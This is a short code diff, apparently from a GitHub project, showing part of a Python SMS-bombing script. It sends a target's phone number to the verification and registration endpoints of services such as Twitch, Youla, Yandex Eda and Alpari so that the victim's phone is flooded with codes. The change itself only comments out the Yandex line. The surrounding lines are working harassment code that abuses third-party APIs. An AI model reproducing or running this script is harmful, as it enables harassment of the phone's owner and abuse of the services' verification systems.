@@ -121,7 +121,7 @@ https://github.com/crinny
 			requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": self.formatted_phone,"username": username})
 			requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': self.formatted_phone},headers={'App-ID': 'cabinet'})
 			requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": self.formatted_phone, "type": 2})
-			requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + self.formatted_phone})
+			#requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + self.formatted_phone})
 			requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': self.formatted_phone})
 			requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": self.formatted_phone, "deliveryOption": "sms"})
 			requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": self.formatted_phone})
